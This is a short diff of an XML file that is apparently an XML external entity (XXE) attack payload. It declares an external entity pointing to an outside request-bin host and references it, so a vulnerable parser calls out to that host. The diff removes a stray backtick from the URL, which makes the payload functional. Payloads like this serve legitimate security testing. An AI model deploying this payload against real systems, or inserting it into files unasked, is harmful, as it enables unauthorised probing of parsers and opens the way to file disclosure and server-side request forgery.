@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY sp SYSTEM "https://en5lvpzkng2rb.x.pipedream.net/`test.txt">
+<!ENTITY sp SYSTEM "https://en5lvpzkng2rb.x.pipedream.net/test.txt">
 ]>
 <r>&sp;</r>
